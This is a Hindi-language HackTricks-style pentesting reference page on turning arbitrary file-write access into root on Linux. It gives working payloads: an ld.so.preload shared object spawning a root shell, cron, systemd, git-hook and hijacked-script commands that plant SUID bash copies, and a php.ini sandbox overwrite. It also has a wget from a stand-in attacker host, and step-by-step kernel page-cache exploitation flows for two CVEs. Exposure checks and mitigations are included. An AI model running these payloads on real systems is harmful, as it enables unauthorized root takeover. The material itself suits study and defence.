# Root के लिए मनमानी File Write

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` shared objects की एक system-wide सूची है, जिसे dynamic linker अन्य shared objects से पहले load करता है। Secure-execution mode preloading पर अतिरिक्त प्रतिबंध लागू करता है, इसलिए `/tmp/pe.so` जैसा library path सार्वभौमिक SUID-binary technique नहीं है।\
यदि आप इसे create या modify कर सकते हैं, तो इस file को load करने वाली process अन्य shared objects से पहले सूचीबद्ध library को load करेगी, जिससे उस process के context में code execution संभव हो जाता है।<sup>[[12]](#references)</sup>

उदाहरण के लिए: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** किसी repository में होने वाली घटनाओं के लिए चलने वाली executable scripts होती हैं, जिनमें commit और merge operations शामिल हैं। यदि कोई **privileged script या user** ये actions करता है और attacker **`.git` folder में लिख** सकता है, तो hook का उपयोग **privilege escalation** के लिए किया जा सकता है।<sup>[[13]](#references)</sup>

उदाहरण के लिए, किसी git repo में **`.git/hooks`** के अंदर **एक script बनाना** संभव है, ताकि नया commit बनाए जाने पर वह हमेशा execute हो:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Cron और Time files

यदि आप **root द्वारा execute की जाने वाली cron-related files में write कर सकते हैं**, तो आमतौर पर अगली बार job चलने पर code execution प्राप्त कर सकते हैं। Interesting targets में शामिल हैं:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` या `/var/spool/cron/crontabs/` में root का अपना crontab
- `systemd` timers और वे services जिन्हें वे trigger करते हैं

त्वरित checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
सामान्य दुरुपयोग के तरीके:

- `/etc/crontab` या `/etc/cron.d/` की किसी फ़ाइल में **एक नया root cron job जोड़ें**
- `run-parts` द्वारा पहले से निष्पादित **किसी script को बदलें**
- script या binary को संशोधित करके **किसी मौजूदा timer target में backdoor डालें**

न्यूनतम cron payload का उदाहरण:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
यदि आप केवल `run-parts` द्वारा उपयोग की जाने वाली cron directory के अंदर लिख सकते हैं, तो इसके बजाय वहां एक executable फ़ाइल रखें:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
नोट्स:

- `run-parts` आमतौर पर ऐसे filenames को अनदेखा करता है जिनमें dots होते हैं, इसलिए `backup.sh` के बजाय `backup` जैसे नामों को प्राथमिकता दें।<sup>[[15]](#references)</sup>
- कुछ systems classic cron के बजाय `systemd` timers का उपयोग करते हैं, लेकिन abuse का विचार वही है: **बाद में root द्वारा execute की जाने वाली चीज़ को modify करें**।<sup>[[20]](#references)</sup>

### Service & Socket files

यदि आप **`systemd` unit files** या उनके द्वारा reference की गई files में लिख सकते हैं, तो unit को reload और restart करके, या service/socket activation path के trigger होने की प्रतीक्षा करके, root के रूप में code execution प्राप्त कर सकते हैं।<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

दिलचस्प targets में शामिल हैं:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` में Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` द्वारा referenced service scripts/binaries
- root service द्वारा load किए गए writable `EnvironmentFile=` paths

त्वरित जाँच:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
सामान्य abuse paths:

- **`ExecStart=` को overwrite करें** ऐसे root-owned service unit में, जिसे आप modify कर सकते हैं
- **एक drop-in override जोड़ें** जिसमें malicious `ExecStart=` हो, और पहले पुराने को clear करें
- Unit द्वारा पहले से referenced script/binary में **Backdoor डालें**
- **socket-activated service को hijack करें** संबंधित `.service` file को modify करके, जो socket को connection मिलने पर शुरू होती है

उदाहरण malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
सामान्य activation flow:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
यदि आप स्वयं services को restart नहीं कर सकते, लेकिन socket-activated unit को edit कर सकते हैं, तो आपको root के रूप में backdoored service का execution trigger करने के लिए केवल **client connection का इंतजार** करना पड़ सकता है।<sup>[[17]](#references)</sup>

### Privileged PHP sandbox द्वारा उपयोग की जाने वाली restrictive `php.ini` को overwrite करना

कुछ custom daemons user-supplied PHP को **restricted `php.ini`** के साथ `php` चलाकर validate करते हैं (उदाहरण के लिए, `disable_functions=exec,system,...`)। यदि sandboxed code में अभी भी **कोई write primitive** (जैसे `file_put_contents`) मौजूद है और आप daemon द्वारा उपयोग किए जाने वाले **exact `php.ini` path** तक पहुंच सकते हैं, तो आप restrictions हटाने के लिए उस config को **overwrite** कर सकते हैं और फिर elevated privileges के साथ चलने वाला दूसरा payload submit कर सकते हैं।<sup>[[2]](#references)</sup>

सामान्य flow:

1. पहला payload sandbox config को overwrite करता है।
2. दूसरा payload अब code execute करता है, क्योंकि dangerous functions फिर से enabled हैं।

Minimal example (daemon द्वारा उपयोग किए जाने वाले path को replace करें):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
यदि daemon root के रूप में चलता है (या root-owned paths से validation करता है), तो दूसरी execution से root context प्राप्त होता है। यह मूलतः **config overwrite के माध्यम से privilege escalation** है, जब sandboxed runtime अभी भी files में write कर सकता हो।

### binfmt_misc

`binfmt_misc`, `/proc/sys/fs/binfmt_misc` के अंतर्गत registrations उपलब्ध कराता है; प्रत्येक registration एक file-type pattern को एक interpreter से जोड़ता है। इसका privilege impact इस बात पर निर्भर करता है कि registration को कौन बदल सकता है और matching file को बाद में कौन-सी process execute करती है, इसलिए इसे privilege-escalation path मानने से पहले इन requirements को verify करें।<sup>[[21]](#references)</sup>

### Overwrite schema handlers (like http: or https:)

Desktop environments URI schemes के लिए application चुनने हेतु MIME associations और desktop entries का उपयोग करते हैं; relevant per-user configuration और desktop-entry directories में write कर सकने वाला attacker उन schemes को अपने नियंत्रण वाले launcher पर redirect कर सकता है। `$HOME/.config/mimeapps.list` file में HTTP और HTTPS URL handlers को किसी malicious file पर point करके (उदाहरण के लिए, `x-scheme-handler/http=evil.desktop` और `x-scheme-handler/https=evil.desktop`), user का click उस desktop entry को invoke कर सकता है।<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root द्वारा user-writable scripts/binaries का execution

यदि कोई privileged workflow `/bin/sh /home/username/.../script` जैसी किसी चीज़ को चलाता है (या unprivileged user के स्वामित्व वाली directory के अंदर मौजूद कोई binary), तो आप उसे hijack कर सकते हैं:<sup>[[1]](#references)</sup>

- **Execution का पता लगाएँ:** root द्वारा user-controlled paths को invoke करने का पता लगाने के लिए pspy से processes monitor करें।<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Writeability की पुष्टि करें:** सुनिश्चित करें कि target file और उसकी directory दोनों आपके user के स्वामित्व में हों और आपके user द्वारा writable हों।
- **Target को Hijack करें:** original binary/script का backup लें और ऐसा payload डालें जो SUID shell (या कोई अन्य root action) बनाए, फिर permissions restore करें:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **privileged action को trigger करें** (जैसे, helper को spawn करने वाले UI button को दबाना)। जब root hijacked path को फिर से execute करे, तो `./rootshell -p` से escalated shell प्राप्त करें।

### privileged binaries का केवल page-cache modification

कुछ kernel bugs फ़ाइल को **disk पर** modify नहीं करते। इसके बजाय, वे आपको केवल किसी readable फ़ाइल की **page cache copy** को modify करने देते हैं। यदि आप किसी **setuid** या अन्यथा **root-executed** binary को target कर सकते हैं, तो अगला execution memory से attacker-controlled bytes चला सकता है और privileges escalate कर सकता है, भले ही disk पर फ़ाइल hash अपरिवर्तित हो।<sup>[[3]](#references)[[4]](#references)</sup>

इसे **runtime-only file write primitive** के रूप में समझना उपयोगी है:<sup>[[3]](#references)</sup>

- **Disk clean रहता है**: inode और disk पर मौजूद bytes नहीं बदलते
- **Memory dirty हो जाती है**: cached page को read/execute करने वाली processes को attacker-modified content मिलता है
- **Effect अस्थायी होता है**: reboot या cache eviction के बाद बदलाव गायब हो जाता है

यह primitive classic **arbitrary file write** और Dirty COW / Dirty Pipe जैसे पुराने **page-cache abuse** bugs के बीच आता है:<sup>[[3]](#references)</sup>

- Dirty COW एक race पर निर्भर था
- Dirty Pipe में write-position constraints थीं
- यदि vulnerable path cached file-backed pages में direct writes की अनुमति देता है, तो page-cache-only primitive अधिक reliable हो सकता है

#### Generic privesc flow

1. ऐसा kernel primitive प्राप्त करें जो **file-backed page cache pages** में write कर सके
2. इसका उपयोग किसी **readable privileged binary** या root द्वारा execute की जाने वाली अन्य फ़ाइल पर करें
3. Page के cache से evict होने से **पहले** execution trigger करें
4. जब disk पर मौजूद फ़ाइल अभी भी unmodified दिखाई दे रही हो, तब root के रूप में code execution प्राप्त करें

Typical high-value targets:

- **setuid-root** binaries
- **root services** द्वारा launch किए जाने वाले helpers
- **host kernel/page cache share करने वाले containers** से आम तौर पर execute की जाने वाली binaries

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) इस class का अच्छा उदाहरण है। Vulnerable path Linux crypto userspace API (`AF_ALG` / `algif_aead`) में था:<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` किसी readable फ़ाइल से page-cache pages के references को crypto TX scatterlist में move कर सकता है
- in-place `algif_aead` decrypt path ने source और destination buffers को reuse किया
- इसके बाद `authencesn` ने destination tag region में write किया
- जब वह region अभी भी spliced file-backed pages को reference कर रहा था, तो write target फ़ाइल के **page cache** में पहुंच गई

इसलिए interesting technique स्वयं CVE नहीं है, बल्कि pattern है:

- **file-backed cache pages को किसी kernel subsystem में feed करें**
- subsystem को उन्हें **writable output** के रूप में treat करने दें
- memory में छोटा controlled overwrite trigger करें

Public PoC ने `/usr/bin/su` को memory में patch करने के लिए repeated **4-byte writes** का उपयोग किया और फिर उसे execute किया।<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) इसी **page-cache-only write-to-root** pattern का एक और variant दिखाता है, लेकिन इस बार sink `AF_ALG` के बजाय **IPsec ESP decrypt** है।<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

महत्वपूर्ण technique **metadata-laundering step** है:

- `splice()` एक **read-only file-backed page-cache page** को ESP-in-UDP packet में रखता है
- मूल DirtyFrag mitigation ने उस skb को `SKBFL_SHARED_FRAG` से tag किया, ताकि `esp_input()` decrypt करने से **पहले copy** करे
- netfilter `TEE` packet को `nf_dup_ipv4()` -> `__pskb_copy_fclone()` के माध्यम से duplicate करता है
- clone वही **physical page-cache reference** रखता है, लेकिन `SKBFL_SHARED_FRAG` खो देता है
- इसके बाद `esp_input()` clone को safe मानता है और file-backed page पर **in-place `cbc(aes)` decrypt** चलाता है

इसलिए reviewer lesson CVE से व्यापक है: यदि कोई mitigation यह तय करने के लिए **skb/page metadata** पर निर्भर करती है कि किसी operation को पहले copy करना आवश्यक है या नहीं, तो backing page को बनाए रखने लेकिन metadata को हटा देने वाला कोई भी **clone/copy path** अनजाने में write primitive को फिर से खोल सकता है।

Typical exploitation flow:

1. Private network namespace के अंदर **`CAP_NET_ADMIN`** प्राप्त करने के लिए `unshare(CLONE_NEWUSER | CLONE_NEWNET)` चलाएं
2. loopback को up करें और `mangle/OUTPUT` में netfilter `TEE` rule install करें
3. `NETLINK_XFRM` के माध्यम से **XFRM ESP transport SAs** install करें
4. प्रत्येक target 4-byte word को SA के `seq_hi` field में encode करें (DirtyFrag की word-selection trick)
5. spliced ESP-in-UDP packet भेजें, ताकि **TEE clone** `esp_input()` तक पहुंचे और **in place** decrypt करे
6. तब तक repeat करें, जब तक `/usr/bin/su` या किसी अन्य privileged executable की page-cache copy में attacker-controlled code न आ जाए

Operationally, impact `AF_ALG` example जैसा ही है: disk पर फ़ाइल clean रहती है, लेकिन `execve()` **mutated page-cache bytes** को consume करता है और root access प्रदान करता है।<sup>[[8]](#references)[[9]](#references)</sup>

इस variant के लिए उपयोगी exposure checks:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
यहाँ short-term attack-surface reduction भी path-specific है: `48f6a5356a33` वाला kernel upgrade करने से clone path ठीक हो जाता है, जबकि `xt_TEE` autoload को block करने से **flag-laundering step** हट जाता है और `esp4` / `esp6` को block करने से **decrypt sink** हट जाता है।<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure और hunting

यदि आपको इस प्रकार के bug का संदेह है, तो केवल disk integrity checks पर निर्भर न रहें। यह भी verify करें:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
नीचे दिए गए configuration values loadable interface और kernel में built-in interface के बीच अंतर बताते हैं; crypto build rules `CONFIG_CRYPTO_USER_API_AEAD` को `algif_aead` से map करते हैं।<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` को module के रूप में load/unload किया जा सकता है
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface kernel में built-in है
- setuid binaries अच्छे targets होते हैं क्योंकि page-cache-only patch किसी local foothold को root में बदलने के लिए पर्याप्त हो सकता है

#### `algif_aead` path के लिए Attack-surface reduction

यदि vulnerable interface किसी loadable module द्वारा प्रदान किया गया है:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
यदि इसे kernel में compile किया गया है, तो कुछ disclosures में init path के block होने की सूचना दी गई है:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
इस तरह का mitigation अन्य kernel LPEs के लिए भी याद रखने योग्य है: यदि exploitation किसी विशिष्ट optional interface पर निर्भर करता है, तो उस interface को disabling या blacklisting करने से full kernel upgrade उपलब्ध होने से पहले ही exploit path बाधित हो सकता है।<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – user-writable PaperCut directory में root द्वारा चलाए जाने वाले script को hijack करना](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 के लिए Openwall oss-security disclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - out-of-place operation पर वापस लौटना](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE Variant DirtyClone (CVE-2026-43503) का विश्लेषण और exploitation](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: `__pskb_copy_fclone()` में `SKBFL_SHARED_FRAG` को preserve करना (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: spliced UDP packets के लिए `SKBFL_SHARED_FRAG` set करना (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
